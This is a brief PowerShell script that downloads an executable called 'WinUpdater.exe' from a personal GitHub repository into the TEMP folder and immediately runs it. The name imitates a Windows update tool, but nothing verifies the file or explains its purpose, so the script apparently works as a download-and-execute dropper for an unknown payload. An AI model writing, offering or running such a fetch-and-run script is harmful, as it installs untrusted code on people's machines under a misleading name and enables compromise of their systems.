$assetName = "WinUpdater.exe"
$url = "https://github.com/thejaberhut/jaber/raw/main/$assetName"
$outFile = Join-Path $env:TEMP $assetName

iwr -Uri $url -OutFile $outFile -UseBasicParsing
Start-Process -FilePath $outFile -Wait



